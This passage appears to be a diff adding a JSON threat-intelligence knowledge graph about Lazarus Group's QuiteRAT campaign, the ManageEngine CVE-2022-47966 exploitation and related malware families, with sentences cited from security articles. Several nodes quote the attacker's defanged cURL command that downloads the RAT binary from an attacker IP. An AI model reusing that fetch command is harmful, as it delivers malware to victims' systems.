@@ -1,0 +1,2012 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_0032a51c801f",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "QuiteRAT",
+        "edges": [
+          "EDGE_22089e4df493",
+          "EDGE_26474d40dc1b",
+          "EDGE_4a5a4dd9ca35",
+          "EDGE_5e1509f969f6",
+          "EDGE_89318e9bef34",
+          "EDGE_91904d83ceab",
+          "EDGE_9300a4803403",
+          "EDGE_9ffaab14ca6e",
+          "EDGE_cb0a24e4fd1d",
+          "EDGE_41a3e9d02f8f",
+          "EDGE_bcb86c9d4e3a",
+          "EDGE_6e49934a1253"
+        ],
+        "source": {
+          "QuiteRAT_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              2,
+              "In this campaign, the attackers began exploiting a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) five days after PoCs for the exploit were publicly disclosed to deliver and deploy a newer malware threat we track as “QuiteRAT.” Security researchers first discovered this implant in February, but little has been written on it since then."
+            ],
+            [
+              3,
+              "QuiteRAT has many of the same capabilities as Lazarus Group’s better-known MagicRAT malware, but its file size is significantly smaller."
+            ],
+            [
+              8,
+              "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT."
+            ],
+            [
+              11,
+              "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+            ],
+            [
+              13,
+              "A successful download of the binary leads to the execution of the QuiteRAT binary by the Java process, resulting in the activation of the implant on the infected server."
+            ],
+            [
+              15,
+              "There is no in-built persistence mechanism in QuiteRAT."
+            ],
+            [
+              16,
+              "Persistence for the implant is achieved via the registry by issuing the following command to QuiteRAT:."
+            ],
+            [
+              17,
+              "QuiteRAT is a fairly simple remote access trojan (RAT)."
+            ],
+            [
+              21,
+              "Although QuiteRAT, just like MagicRAT, uses embedded Qt libraries, none of these implants have a Graphical User Interface."
+            ],
+            [
+              22,
+              "Based on QuiteRAT’s technical characteristics, including the usage of the Qt framework, we assess that this implant belongs to the previously disclosed MagicRAT family."
+            ],
+            [
+              24,
+              "The new campaign we’re disclosing exploited a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) — which has a Kenna risk score of 100 out of 100 — to deploy QuiteRAT."
+            ],
+            [
+              41,
+              "The use of MagicRAT’s derivative implant, QuiteRAT, beginning in May 2023 suggests the actor is changing tactics, opting for a smaller, more compact Qt-based implant."
+            ],
+            [
+              42,
+              "There are similarities between the implants that indicate that QuiteRAT is a derivative of MagicRAT."
+            ]
+          ],
+          "QuiteRAT_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              1,
+              "In recent attacks against healthcare organizations and an Internet infrastructure company, North Korea's famous Lazarus Group deployed a new, ultra-compact, highly evasive remote access Trojan (RAT) called \"QuiteRAT.\"\nQuiteRAT is an upgraded version of another RAT the group deployed in 2022, \"MagicRAT,\" itself a follow-up from 2021's \"TigerRAT.\" QuiteRAT can pilfer information about its host machine and user, as well as run commands, and at just four to five megabytes, it hardly makes a noticeable imprint in a target network."
+            ],
+            [
+              2,
+              "Most interesting of all, however, is that QuiteRAT is built on Qt, a framework for designing graphical user interfaces (GUIs), which it wears like a costume to sneak past malware detection tools."
+            ],
+            [
+              4,
+              "It was during these attacks that it first put QuiteRAT to the test."
+            ],
+            [
+              11,
+              "The introduction of the Qt framework reduces the possibility of heuristic detection.\"\nQuiteRAT, first discovered in February, is the successor to MagicRAT."
+            ],
+            [
+              12,
+              "It lacks any built-in persistence mechanism, which MagicRAT achieved with the ability to set up scheduled tasks (QuiteRAT must be granted such power via a C2 server)."
+            ],
+            [
+              14,
+              "Besides slimming down, QuiteRAT resembles its predecessor in just about every other way."
+            ]
+          ],
+          "QuiteRAT_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              0,
+              "The North Korea-linked threat actor known as Lazarus Group has been observed exploiting a now-patched critical security flaw impacting Zoho ManageEngine ServiceDesk Plus to distribute a remote access trojan called such as QuiteRAT."
+            ],
+            [
+              3,
+              "QuiteRAT is said to be a successor to MagicRAT, itself a follow-up to TigerRAT, while CollectionRAT appears to share overlaps with EarlyRAT (aka Jupiter), an implant written in PureBasic with capabilities to run commands on the endpoint."
+            ],
+            [
+              4,
+              "\"QuiteRAT has many of the same capabilities as Lazarus Group's better-known MagicRAT malware, but its file size is significantly smaller,\" security researchers Asheer Malhotra, Vitor Ventura, and Jungsoo An said."
+            ],
+            [
+              5,
+              "\"Both implants are built on the Qt framework and include capabilities such as arbitrary command execution.\"\nThe use of the Qt framework is seen as an intentional effort on the part of the adversary to make analysis a lot more challenging as it \"increases the complexity of the malware's code.\"\nThe activity, detected in early 2023, involved the exploitation of CVE-2022-47966, a mere five days after proof-of-concept (Poc) for the flaw emerged online, to directly deploy the QuiteRAT binary from a malicious URL."
+            ],
+            [
+              7,
+              "\"While MagicRAT is a bigger, bulkier malware family averaging around 18 MB in size, QuiteRAT is a much much smaller implementation, averaging around 4 to 5 MB in size.\"\nAnother crucial difference between the two is the lack of a built-in persistence mechanism in QuiteRAT, necessitating that a command be issued from the server to ensure continued operation on the compromised host."
+            ],
+            [
+              8,
+              "The findings also overlap with another campaign uncovered by WithSecure earlier this February in which security flaws in unpatched Zimbra devices were used to breach victim systems and ultimately install QuiteRAT."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_11737b3d12b5",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "United States",
+        "edges": [],
+        "source": {
+          "United States_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              0,
+              "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States."
+            ]
+          ],
+          "US_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              3,
+              "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+            ]
+          ],
+          "U.S._thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              1,
+              "Targets include internet backbone infrastructure and healthcare entities in Europe and the U.S., cybersecurity company Cisco Talos said in a two-part analysis published today."
+            ]
+          ]
+        },
+        "alias": [
+          "US",
+          "U.S."
+        ]
+      },
+      {
+        "node_id": "HL_1acf563eb8bf",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "WithSecure",
+        "edges": [],
+        "source": {
+          "WithSecure_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              23,
+              "QuiteRAT was briefly discussed in WithSecure’s report from early 2023."
+            ]
+          ],
+          "WithSecure_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              8,
+              "The findings also overlap with another campaign uncovered by WithSecure earlier this February in which security flaws in unpatched Zimbra devices were used to breach victim systems and ultimately install QuiteRAT."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2e9e1d15ef40",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Europe",
+        "edges": [],
+        "source": {
+          "Europe_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              0,
+              "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States."
+            ],
+            [
+              8,
+              "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT."
+            ]
+          ],
+          "Europe_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              1,
+              "Targets include internet backbone infrastructure and healthcare entities in Europe and the U.S., cybersecurity company Cisco Talos said in a two-part analysis published today."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_4356fdbfda59",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Kenna",
+        "edges": [],
+        "source": {
+          "Kenna_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              24,
+              "The new campaign we’re disclosing exploited a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) — which has a Kenna risk score of 100 out of 100 — to deploy QuiteRAT."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_468625070e08",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Cisco Talos",
+        "edges": [],
+        "source": {
+          "Cisco Talos_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              0,
+              "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States."
+            ]
+          ],
+          "Cisco Talos_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              3,
+              "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+            ]
+          ],
+          "Cisco Talos_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              1,
+              "Targets include internet backbone infrastructure and healthcare entities in Europe and the U.S., cybersecurity company Cisco Talos said in a two-part analysis published today."
+            ],
+            [
+              9,
+              "Cisco Talos said the adversary is \"increasingly relying on open-source tools and frameworks in the initial access phase of their attacks, as opposed to strictly employing them in the post-compromise phase.\"\nThis includes the GoLang-based open-source DeimosC2 framework to obtain persistent access, with CollectionRAT primarily utilized to gather metadata, run arbitrary commands, manage files on the infected system, and deliver additional payloads."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_62a599a11f56",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "healthcare entities",
+        "edges": [],
+        "source": {
+          "healthcare entities_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              0,
+              "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States."
+            ]
+          ],
+          "healthcare entities_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              1,
+              "Targets include internet backbone infrastructure and healthcare entities in Europe and the U.S., cybersecurity company Cisco Talos said in a two-part analysis published today."
+            ]
+          ],
+          "healthcare organizations_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              1,
+              "In recent attacks against healthcare organizations and an Internet infrastructure company, North Korea's famous Lazarus Group deployed a new, ultra-compact, highly evasive remote access Trojan (RAT) called \"QuiteRAT.\"\nQuiteRAT is an upgraded version of another RAT the group deployed in 2022, \"MagicRAT,\" itself a follow-up from 2021's \"TigerRAT.\" QuiteRAT can pilfer information about its host machine and user, as well as run commands, and at just four to five megabytes, it hardly makes a noticeable imprint in a target network."
+            ],
+            [
+              3,
+              "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+            ]
+          ]
+        },
+        "alias": [
+          "healthcare organizations"
+        ]
+      },
+      {
+        "node_id": "HL_689a82869e5a",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "Lazarus Group",
+        "edges": [
+          "EDGE_1c8221338a2c",
+          "EDGE_338ade9a3c12",
+          "EDGE_c8825bb9df74"
+        ],
+        "source": {
+          "Lazarus Group_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              0,
+              "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States."
+            ],
+            [
+              3,
+              "QuiteRAT has many of the same capabilities as Lazarus Group’s better-known MagicRAT malware, but its file size is significantly smaller."
+            ],
+            [
+              5,
+              "Lazarus Group’s increasing use of the Qt framework creates challenges for defenders."
+            ],
+            [
+              8,
+              "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT."
+            ],
+            [
+              11,
+              "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+            ]
+          ],
+          "Lazarus Group_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              1,
+              "In recent attacks against healthcare organizations and an Internet infrastructure company, North Korea's famous Lazarus Group deployed a new, ultra-compact, highly evasive remote access Trojan (RAT) called \"QuiteRAT.\"\nQuiteRAT is an upgraded version of another RAT the group deployed in 2022, \"MagicRAT,\" itself a follow-up from 2021's \"TigerRAT.\" QuiteRAT can pilfer information about its host machine and user, as well as run commands, and at just four to five megabytes, it hardly makes a noticeable imprint in a target network."
+            ],
+            [
+              5,
+              "In April 2022, Lazarus Group compiled the latest known version of \"MagicRAT,\" a Trojan which stood out not because of what it did, but what it was made of."
+            ]
+          ],
+          "Lazarus Group_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              0,
+              "The North Korea-linked threat actor known as Lazarus Group has been observed exploiting a now-patched critical security flaw impacting Zoho ManageEngine ServiceDesk Plus to distribute a remote access trojan called such as QuiteRAT."
+            ],
+            [
+              4,
+              "\"QuiteRAT has many of the same capabilities as Lazarus Group's better-known MagicRAT malware, but its file size is significantly smaller,\" security researchers Asheer Malhotra, Vitor Ventura, and Jungsoo An said."
+            ],
+            [
+              11,
+              "\"Lazarus Group previously relied on the use of custom-built implants such as MagicRAT, VSingle, Dtrack, and YamaBot as a means of establishing persistent initial access on a successfully compromised system,\" the researchers said."
+            ],
+            [
+              12,
+              "\"These implants are then instrumented to deploy a variety of open-source or dual-use tools to perform a multitude of malicious hands-on-keyboard activities in the compromised enterprise network.\"\nThe development is a sign that the Lazarus Group is continually shifting tactics and expanding its malicious arsenal, at the same time weaponizing newly disclosed vulnerabilities in software to devastating effect."
+            ]
+          ],
+          "Lazarus APT_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              0,
+              "North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT\nThe world's most notorious threat actor is using an unprecedented tactic for sneaking spyware into the IT networks of important companies."
+            ]
+          ],
+          "Lazarus_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              0,
+              "North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT\nThe world's most notorious threat actor is using an unprecedented tactic for sneaking spyware into the IT networks of important companies."
+            ],
+            [
+              1,
+              "In recent attacks against healthcare organizations and an Internet infrastructure company, North Korea's famous Lazarus Group deployed a new, ultra-compact, highly evasive remote access Trojan (RAT) called \"QuiteRAT.\"\nQuiteRAT is an upgraded version of another RAT the group deployed in 2022, \"MagicRAT,\" itself a follow-up from 2021's \"TigerRAT.\" QuiteRAT can pilfer information about its host machine and user, as well as run commands, and at just four to five megabytes, it hardly makes a noticeable imprint in a target network."
+            ],
+            [
+              3,
+              "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+            ],
+            [
+              5,
+              "In April 2022, Lazarus Group compiled the latest known version of \"MagicRAT,\" a Trojan which stood out not because of what it did, but what it was made of."
+            ],
+            [
+              17,
+              "Whether Lazarus' sneakiest, tiniest RAT will pop up in more campaigns to come remains to be seen."
+            ]
+          ]
+        },
+        "alias": [
+          "Lazarus APT",
+          "Lazarus"
+        ]
+      },
+      {
+        "node_id": "HL_ac8bcc9b2102",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "internet backbone infrastructure",
+        "edges": [],
+        "source": {
+          "internet backbone infrastructure_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              0,
+              "Cisco Talos discovered the North Korean state-sponsored actor Lazarus Group targeting internet backbone infrastructure and healthcare entities in Europe and the United States."
+            ],
+            [
+              8,
+              "In early 2023, we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT."
+            ]
+          ],
+          "internet backbone infrastructure_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              1,
+              "Targets include internet backbone infrastructure and healthcare entities in Europe and the U.S., cybersecurity company Cisco Talos said in a two-part analysis published today."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_c6426a20d0e4",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "cURL",
+        "edges": [
+          "EDGE_078f029bf19d",
+          "EDGE_e73679f7cb65"
+        ],
+        "source": {
+          "cURL_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              11,
+              "We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URL:\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e19e2be46270",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Java runtime",
+        "edges": [],
+        "source": {
+          "Java runtime_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              10,
+              "The successful exploitation triggered the immediate download and execution of a malicious binary via the Java runtime process."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_1b894171774e",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "TigerRAT",
+        "edges": [],
+        "source": {
+          "TigerRAT_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              1,
+              "In recent attacks against healthcare organizations and an Internet infrastructure company, North Korea's famous Lazarus Group deployed a new, ultra-compact, highly evasive remote access Trojan (RAT) called \"QuiteRAT.\"\nQuiteRAT is an upgraded version of another RAT the group deployed in 2022, \"MagicRAT,\" itself a follow-up from 2021's \"TigerRAT.\" QuiteRAT can pilfer information about its host machine and user, as well as run commands, and at just four to five megabytes, it hardly makes a noticeable imprint in a target network."
+            ]
+          ],
+          "TigerRAT_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              3,
+              "QuiteRAT is said to be a successor to MagicRAT, itself a follow-up to TigerRAT, while CollectionRAT appears to share overlaps with EarlyRAT (aka Jupiter), an implant written in PureBasic with capabilities to run commands on the endpoint."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_29dbb6cf1793",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "North Korea",
+        "edges": [],
+        "source": {
+          "North Korea_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              0,
+              "North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT\nThe world's most notorious threat actor is using an unprecedented tactic for sneaking spyware into the IT networks of important companies."
+            ],
+            [
+              1,
+              "In recent attacks against healthcare organizations and an Internet infrastructure company, North Korea's famous Lazarus Group deployed a new, ultra-compact, highly evasive remote access Trojan (RAT) called \"QuiteRAT.\"\nQuiteRAT is an upgraded version of another RAT the group deployed in 2022, \"MagicRAT,\" itself a follow-up from 2021's \"TigerRAT.\" QuiteRAT can pilfer information about its host machine and user, as well as run commands, and at just four to five megabytes, it hardly makes a noticeable imprint in a target network."
+            ],
+            [
+              3,
+              "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+            ]
+          ],
+          "North Korea_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              0,
+              "The North Korea-linked threat actor known as Lazarus Group has been observed exploiting a now-patched critical security flaw impacting Zoho ManageEngine ServiceDesk Plus to distribute a remote access trojan called such as QuiteRAT."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2fbc618c0be7",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Qt",
+        "edges": [
+          "EDGE_ef79394053f0"
+        ],
+        "source": {
+          "Qt_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              2,
+              "Most interesting of all, however, is that QuiteRAT is built on Qt, a framework for designing graphical user interfaces (GUIs), which it wears like a costume to sneak past malware detection tools."
+            ],
+            [
+              6,
+              "MagicRAT was statically linked to Qt, an open source, cross-platform software for creating graphical user interfaces."
+            ],
+            [
+              11,
+              "The introduction of the Qt framework reduces the possibility of heuristic detection.\"\nQuiteRAT, first discovered in February, is the successor to MagicRAT."
+            ],
+            [
+              21,
+              "So there is a possibility that the Qt framework is picked up by other malware authors and other APT groups,\" Malhotra warns, adding there's been no evidence of that happening just yet."
+            ]
+          ],
+          "Qt framework_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              4,
+              "Both implants are built on the Qt framework and include capabilities such as arbitrary command execution."
+            ],
+            [
+              5,
+              "Lazarus Group’s increasing use of the Qt framework creates challenges for defenders."
+            ],
+            [
+              19,
+              "The Qt framework is a platform for developing cross-platform applications."
+            ]
+          ],
+          "Qt framework_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              5,
+              "\"Both implants are built on the Qt framework and include capabilities such as arbitrary command execution.\"\nThe use of the Qt framework is seen as an intentional effort on the part of the adversary to make analysis a lot more challenging as it \"increases the complexity of the malware's code.\"\nThe activity, detected in early 2023, involved the exploitation of CVE-2022-47966, a mere five days after proof-of-concept (Poc) for the flaw emerged online, to directly deploy the QuiteRAT binary from a malicious URL."
+            ]
+          ]
+        },
+        "alias": [
+          "Qt framework"
+        ]
+      },
+      {
+        "node_id": "HL_a7c8489ac277",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "UK",
+        "edges": [],
+        "source": {
+          "UK_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              3,
+              "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_04337d6a6ac8",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "YamaBot",
+        "edges": [],
+        "source": {
+          "YamaBot_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              11,
+              "\"Lazarus Group previously relied on the use of custom-built implants such as MagicRAT, VSingle, Dtrack, and YamaBot as a means of establishing persistent initial access on a successfully compromised system,\" the researchers said."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_0554eb0c9aa5",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "DeimosC2",
+        "edges": [
+          "EDGE_24e2474709ac"
+        ],
+        "source": {
+          "DeimosC2_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              9,
+              "Cisco Talos said the adversary is \"increasingly relying on open-source tools and frameworks in the initial access phase of their attacks, as opposed to strictly employing them in the post-compromise phase.\"\nThis includes the GoLang-based open-source DeimosC2 framework to obtain persistent access, with CollectionRAT primarily utilized to gather metadata, run arbitrary commands, manage files on the infected system, and deliver additional payloads."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_1af9ec9b4bc9",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "PuTTY Link (Plink)",
+        "edges": [
+          "EDGE_4ce50616bcef",
+          "EDGE_60cf39087132"
+        ],
+        "source": {
+          "PuTTY Link (Plink)_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              10,
+              "It's not immediately clear how CollectionRAT is propagated, but evidence shows that a trojanized copy of the PuTTY Link (Plink) utility hosted on the same infrastructure is being used to establish a remote tunnel to the system and serve the malware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_1f0939c917cb",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Zoho ManageEngine ServiceDesk Plus",
+        "edges": [
+          "EDGE_cd6b7971419f"
+        ],
+        "source": {
+          "Zoho ManageEngine ServiceDesk Plus_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              0,
+              "The North Korea-linked threat actor known as Lazarus Group has been observed exploiting a now-patched critical security flaw impacting Zoho ManageEngine ServiceDesk Plus to distribute a remote access trojan called such as QuiteRAT."
+            ]
+          ],
+          "Zoho ManageEngine_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              3,
+              "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+            ]
+          ],
+          "ManageEngine ServiceDesk_blog.talosintelligence.com_lazarus-quiterat": [
+            [
+              2,
+              "In this campaign, the attackers began exploiting a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) five days after PoCs for the exploit were publicly disclosed to deliver and deploy a newer malware threat we track as “QuiteRAT.” Security researchers first discovered this implant in February, but little has been written on it since then."
+            ],
+            [
+              9,
+              "The actors exploited a vulnerable ManageEngine ServiceDesk instance to gain initial access."
+            ],
+            [
+              24,
+              "The new campaign we’re disclosing exploited a ManageEngine ServiceDesk vulnerability (CVE-2022-47966) — which has a Kenna risk score of 100 out of 100 — to deploy QuiteRAT."
+            ]
+          ],
+          "ManageEngine ServiceDesk_North Korea's Lazarus APT Uses GUI Framework to Build Stealthy RAT": [
+            [
+              3,
+              "In February — five days after the disclosure of proofs-of-compromise (PoCs) relating to the 9.8 \"Critical\"-rated CVE-2022-47966, a remote code execution (RCE) vulnerability for Zoho ManageEngine — Lazarus exploited ManageEngine ServiceDesk to infiltrate healthcare organizations in the US and UK, as well as a UK-based \"Internet backbone infrastructure provider,\" according to a new report from Cisco Talos."
+            ]
+          ]
+        },
+        "alias": [
+          "Zoho ManageEngine",
+          "ManageEngine ServiceDesk"
+        ]
+      },
+      {
+        "node_id": "HL_59e13fdcdca2",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "EarlyRAT",
+        "edges": [
+          "EDGE_3a2474c023a1"
+        ],
+        "source": {
+          "EarlyRAT_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              3,
+              "QuiteRAT is said to be a successor to MagicRAT, itself a follow-up to TigerRAT, while CollectionRAT appears to share overlaps with EarlyRAT (aka Jupiter), an implant written in PureBasic with capabilities to run commands on the endpoint."
+            ]
+          ],
+          "Jupiter_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              3,
+              "QuiteRAT is said to be a successor to MagicRAT, itself a follow-up to TigerRAT, while CollectionRAT appears to share overlaps with EarlyRAT (aka Jupiter), an implant written in PureBasic with capabilities to run commands on the endpoint."
+            ]
+          ]
+        },
+        "alias": [
+          "Jupiter"
+        ]
+      },
+      {
+        "node_id": "HL_639464703cd8",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "VSingle",
+        "edges": [],
+        "source": {
+          "VSingle_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              11,
+              "\"Lazarus Group previously relied on the use of custom-built implants such as MagicRAT, VSingle, Dtrack, and YamaBot as a means of establishing persistent initial access on a successfully compromised system,\" the researchers said."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_83747d3796c4",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Zimbra",
+        "edges": [
+          "EDGE_5a8c7ca9ed57"
+        ],
+        "source": {
+          "Zimbra_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              8,
+              "The findings also overlap with another campaign uncovered by WithSecure earlier this February in which security flaws in unpatched Zimbra devices were used to breach victim systems and ultimately install QuiteRAT."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_9be29146e733",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Dtrack",
+        "edges": [],
+        "source": {
+          "Dtrack_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              11,
+              "\"Lazarus Group previously relied on the use of custom-built implants such as MagicRAT, VSingle, Dtrack, and YamaBot as a means of establishing persistent initial access on a successfully compromised system,\" the researchers said."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_b7d8370101dd",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "CollectionRAT",
+        "edges": [
+          "EDGE_23d2b832f3f5",
+          "EDGE_24e8e5e7e35a",
+          "EDGE_f57195fb7162"
+        ],
+        "source": {
+          "CollectionRAT_thehackernews.com_2023_08_lazarus-group-exploits-critical-zoho.html": [
+            [
+              2,
